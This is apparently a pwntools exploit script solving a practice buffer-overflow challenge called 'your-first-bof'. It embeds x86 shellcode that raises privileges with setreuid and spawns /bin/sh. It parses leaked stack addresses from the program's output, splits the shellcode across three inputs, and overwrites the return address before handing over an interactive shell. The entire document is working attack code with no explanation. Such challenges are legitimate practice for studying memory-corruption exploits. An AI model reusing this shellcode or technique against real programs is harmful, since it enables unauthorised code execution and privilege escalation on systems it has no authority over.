from pwn import *

payload = b"\x6a\x31\x58\x99\xcd\x80\x89\xc3\x89\xc1\x6a\x46\x58\xcd\x80\xb0\x0b\x52\x68\x6e\x2f\x73\x68\x68\x2f\x2f\x62\x69\x89\xe3\x89\xd1\xcd\x80"
p = process("../../your-first-bof/your-first-bof", stdin=PTY)

#p = process("./bof", stdin=PTY)
recv = p.recvuntil('>>> ').decode().split('\n')

for line in recv:
    if 'addr of name' in line:
        n = line
    elif 'addr of comment' in line:
        c = line

addr_n = n.split('x')[1]
baddr = p32(int(addr_n,16))
addr_c = c.split('x')[1]
print(addr_n, addr_c)
print(len(payload[26:]))

#gdb.attach(p)

s1 = payload[:16]
s2 = payload[16:32]
#s3 = payload[32:] + b'\x90'*5 + baddr
s3 = payload[32:]+b'\x90'*(28 - len(payload[32:])) + baddr

print(len(s1), len(s2), len(s3), len(baddr))
print(s1, '\n', s2, '\n', s3)
p.sendline(s1)
print(p.recvuntil('>>> '))
p.sendline(s2)
print(p.recvuntil(': '))

a = input()
p.sendline(s3)

p.interactive()

